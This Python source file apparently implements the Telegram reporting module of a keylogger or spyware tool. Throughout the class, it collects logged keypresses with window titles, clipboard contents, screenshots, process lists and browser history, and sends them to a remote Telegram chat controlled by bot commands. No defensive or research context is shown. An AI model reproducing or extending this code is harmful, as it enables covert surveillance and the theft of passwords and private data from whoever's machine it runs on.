import asyncio
from telegram import Bot, Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
import json
import os
from datetime import datetime, timedelta
from PIL import Image
import telegram

class TelegramReporter:
    def __init__(self, token, chat_id, log_dir="logs", report_interval=300):
        self.token = token
        self.chat_id = chat_id
        self.log_dir = log_dir
        self.report_interval = report_interval
        self.bot = telegram.Bot(token=token)
        self._stop_event = asyncio.Event()
        self._running = False
        self.event_types = [
            "keypress", "screenshot", "clipboard", 
            "process", "active_window", "browser_history"
        ]

    async def setup_commands(self):
        """Set up bot commands with descriptions"""
        commands = [
            BotCommand("menu", "Show main menu"),
            BotCommand("start", "Start receiving log reports"),
            BotCommand("stop", "Stop log reporting"),
            BotCommand("getlogs", "Get logs by type"),
            BotCommand("summary", "Get summary of recent activities"),
            BotCommand("last_screenshot", "Get the most recent screenshot"),
            BotCommand("status", "Check bot and logger status"),
            BotCommand("help", "Show available commands")
        ]
        await self.app.bot.set_my_commands(commands)

    def create_main_menu(self):
        keyboard = [
            [InlineKeyboardButton("📊 Get Logs", callback_data='get_logs'),
             InlineKeyboardButton("📸 Last Screenshot", callback_data='last_screenshot')],
            [InlineKeyboardButton("📈 Summary", callback_data='summary'),
             InlineKeyboardButton("ℹ️ Status", callback_data='status')],
            [InlineKeyboardButton("▶️ Start", callback_data='start'),
             InlineKeyboardButton("⏹️ Stop", callback_data='stop')],
            [InlineKeyboardButton("❓ Help", callback_data='help')]
        ]
        return InlineKeyboardMarkup(keyboard)

    def create_logs_menu(self):
        keyboard = []
        row = []
        for i, event_type in enumerate(self.event_types):
            row.append(InlineKeyboardButton(
                f"📝 {event_type}", 
                callback_data=f'logs_{event_type}'
            ))
            if len(row) == 2 or i == len(self.event_types) - 1:
                keyboard.append(row)
                row = []
        keyboard.append([InlineKeyboardButton("🔙 Back to Main Menu", callback_data='main_menu')])
        return InlineKeyboardMarkup(keyboard)

    async def start(self):
        self._running = True
        try:
            application = Application.builder().token(self.token).build()
            
            # Start the bot in the background
            await application.initialize()
            await application.start()
            
            while self._running and not self._stop_event.is_set():
                try:
                    await asyncio.sleep(1)
                except asyncio.CancelledError:
                    break
                
            # Graceful shutdown
            await application.stop()
            await application.shutdown()
            
        except Exception as e:
            print(f"Telegram reporter error: {e}")
        finally:
            self._running = False

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()

        if query.data == 'main_menu':
            await query.message.edit_text(
                "🎛️ <b>Main Menu</b>\nSelect an option:",
                reply_markup=self.create_main_menu(),
                parse_mode='HTML'
            )
        elif query.data == 'get_logs':
            await query.message.edit_text(
                "📝 <b>Select Log Type</b>\nChoose the type of logs you want to view:",
                reply_markup=self.create_logs_menu(),
                parse_mode='HTML'
            )
        elif query.data.startswith('logs_'):
            event_type = query.data.split('_')[1]
            logs = self.get_latest_logs(event_type, 5)
            await query.message.edit_text(
                f"📋 <b>Latest {event_type} Logs</b>\n\n{logs}",
                parse_mode='HTML',
                reply_markup=self.create_logs_menu()
            )
        elif query.data in ['start', 'stop', 'status', 'summary', 'last_screenshot', 'help']:
            command_map = {
                'start': self.cmd_start,
                'stop': self.cmd_stop,
                'status': self.cmd_status,
                'summary': self.cmd_summary,
                'last_screenshot': self.cmd_last_screenshot,
                'help': self.cmd_help
            }
            await command_map[query.data](update, context)

    async def cmd_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "🎛️ <b>Main Menu</b>\nSelect an option:",
            reply_markup=self.create_main_menu(),
            parse_mode='HTML'
        )

    async def stop(self):
        self._running = False
        self._stop_event.set()

    async def send_message(self, message):
        if not self._running:
            return
        try:
            async with Bot(self.token) as bot:
                await bot.send_message(
                    chat_id=self.chat_id, 
                    text=message, 
                    parse_mode='HTML',
                    disable_web_page_preview=True
                )
        except Exception as e:
            print(f"Error sending Telegram message: {str(e)}")

    async def send_photo(self, photo_path, caption=None):
        try:
            async with Bot(self.token) as bot:
                with open(photo_path, 'rb') as photo:
                    await bot.send_photo(
                        chat_id=self.chat_id, 
                        photo=photo, 
                        caption=caption,
                        parse_mode='HTML'
                    )
        except Exception as e:
            await self.send_message(f"❌ Error sending photo: {str(e)}")

    def get_latest_logs(self, event_type=None, minutes=5):
        try:
            logs = []
            cutoff_time = datetime.now() - timedelta(minutes=minutes)
            
            # Get the latest log file for the specified event type
            log_files = []
            if event_type:
                pattern = f"{event_type.lower()}_"
                log_files = [f for f in os.listdir(self.log_dir) if f.startswith(pattern)]
            else:
                log_files = [f for f in os.listdir(self.log_dir) if f.endswith('.json')]

            if not log_files:
                return f"No log files found for {event_type if event_type else 'any event type'}."

            latest_file = os.path.join(self.log_dir, sorted(log_files)[-1])
            
            with open(latest_file, 'r') as f:
                data = json.load(f)
                for entry in data:
                    timestamp = datetime.fromisoformat(entry['timestamp'])
                    if timestamp > cutoff_time:
                        logs.append(f"🕒 {timestamp.strftime('%H:%M:%S')} - {self._format_log_entry(entry)}")

            if not logs:
                return f"No new logs in the last {minutes} minutes."
            
            return "\n\n".join(logs[-10:])  # Return last 10 logs
        except Exception as e:
            return f"Error retrieving logs: {str(e)}"

    def _format_log_entry(self, entry):
        """Format log entry for readable output with proper HTML escaping"""
        try:
            data = entry['data']
            # Escape HTML entities for all text content
            def escape_html(text):
                return str(text).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            
            if 'window' in data and 'key' in data:
                window = escape_html(data['window'])
                key = escape_html(data['key'])
                return (
                    f"🔑 <b>Keypress</b>\n"
                    f"<i>Window:</i> {window}\n"
                    f"<i>Key:</i> {key}"
                )
            elif 'content' in data:
                content = escape_html(data['content'][:100])
                return f"📋 <b>Clipboard</b>\n<i>Content:</i> {content}..."
            elif 'filepath' in data:
                filepath = escape_html(data['filepath'])
                return f"📸 <b>Screenshot</b>\n<i>Path:</i> {filepath}"
            elif 'pid' in data:
                name = escape_html(data['name'])
                return f"⚙️ <b>Process</b>\n<i>Name:</i> {name}\n<i>PID:</i> {data['pid']}"
            elif 'url' in data:
                url = escape_html(data['url'])
                return f"🌐 <b>Browser</b>\n<i>URL:</i> {url}"
            return escape_html(str(data))
        except Exception as e:
            return f"Error formatting entry: {str(e)}"

    def get_summary(self, hours=1):
        """Get summary of events in the last X hours"""
        try:
            summary = {}
            cutoff_time = datetime.now() - timedelta(hours=hours)
            
            for event_type in self.event_types:
                pattern = f"{event_type.lower()}_"
                log_files = [f for f in os.listdir(self.log_dir) if f.startswith(pattern)]
                
                if not log_files:
                    continue
                    
                latest_file = os.path.join(self.log_dir, sorted(log_files)[-1])
                with open(latest_file, 'r') as f:
                    data = json.load(f)
                    count = sum(1 for entry in data 
                              if datetime.fromisoformat(entry['timestamp']) > cutoff_time)
                    if count > 0:
                        summary[event_type] = count

            return summary
        except Exception as e:
            return f"Error generating summary: {str(e)}"

    def get_latest_screenshot(self):
        """Get the path to the most recent screenshot"""
        try:
            screenshots_dir = "screenshots"
            if not os.path.exists(screenshots_dir):
                return None
            
            screenshots = [f for f in os.listdir(screenshots_dir) if f.endswith(('.png', '.jpg'))]
            if not screenshots:
                return None
                
            return os.path.join(screenshots_dir, sorted(screenshots)[-1])
        except Exception:
            return None

    # Command handlers
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self._running = True
        message = (
            "🟢 <b>Bot Started</b>\n\n"
            "• You will receive periodic log updates\n"
            "• Use /menu to access all features\n"
            "• Use /help for command details"
        )
        if hasattr(update, 'callback_query'):
            await update.callback_query.message.edit_text(
                message,
                parse_mode='HTML',
                reply_markup=self.create_main_menu()
            )
        else:
            await update.message.reply_text(
                message,
                parse_mode='HTML',
                reply_markup=self.create_main_menu()
            )

    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self._running = False
        message = "🔴 <b>Bot Stopped</b>\nYou will no longer receive updates."
        if hasattr(update, 'callback_query'):
            await update.callback_query.message.edit_text(
                message,
                parse_mode='HTML',
                reply_markup=self.create_main_menu()
            )
        else:
            await update.message.reply_text(
                message,
                parse_mode='HTML',
                reply_markup=self.create_main_menu()
            )

    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        status = "🟢 <b>Running</b>" if self._running else "🔴 <b>Stopped</b>"
        message = f"Bot is currently {status}"
        if hasattr(update, 'callback_query'):
            await update.callback_query.message.edit_text(
                message,
                parse_mode='HTML',
                reply_markup=self.create_main_menu()
            )
        else:
            await update.message.reply_text(
                message,
                parse_mode='HTML',
                reply_markup=self.create_main_menu()
            )

    async def cmd_get_logs(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        event_type = None
        minutes = 5
        
        if context.args:
            if context.args[0] in self.event_types:
                event_type = context.args[0]
            if len(context.args) > 1 and context.args[1].isdigit():
                minutes = int(context.args[1])
        
        logs = self.get_latest_logs(event_type, minutes)
        await update.message.reply_text(logs, parse_mode='HTML')

    async def cmd_summary(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        summary = self.get_summary()
        if isinstance(summary, dict):
            text = "<b>📊 Activity Summary (Last Hour)</b>\n\n"
            for event_type, count in summary.items():
                text += f"• <code>{event_type}</code>: {count} events\n"
            await update.message.reply_text(
                text,
                parse_mode='HTML',
                disable_web_page_preview=True
            )
        else:
            await update.message.reply_text(
                f"<i>{summary}</i>",
                parse_mode='HTML'
            )

    async def cmd_last_screenshot(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        screenshot_path = self.get_latest_screenshot()
        if screenshot_path:
            await self.send_photo(screenshot_path, "Latest screenshot")
        else:
            await update.message.reply_text("No screenshots available.")

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = (
            "<b>📋 Available Commands:</b>\n\n"
            "<code>/start</code> - Start receiving log reports\n"
            "<code>/stop</code> - Stop log reporting\n"
            "<code>/getlogs</code> [type] [minutes] - Get specific logs\n"
            "<code>/summary</code> - Get activity summary\n"
            "<code>/last_screenshot</code> - View latest screenshot\n"
            "<code>/status</code> - Check bot status\n"
            "<code>/help</code> - Show this help message\n\n"
            "<b>Event Types:</b>\n"
            "• <code>keypress</code> - Keyboard activity\n"
            "• <code>screenshot</code> - Screen captures\n"
            "• <code>clipboard</code> - Clipboard content\n"
            "• <code>process</code> - Running processes\n"
            "• <code>active_window</code> - Active windows\n"
            "• <code>browser_history</code> - Browser activity\n\n"
            "<b>Examples:</b>\n"
            "<code>/getlogs keypress 10</code>\n"
            "<code>/getlogs clipboard</code>"
        )
        await update.message.reply_text(
            help_text,
            parse_mode='HTML',
            disable_web_page_preview=True
        )

def create_telegram_reporter(token, chat_id):
    return TelegramReporter(token, chat_id)
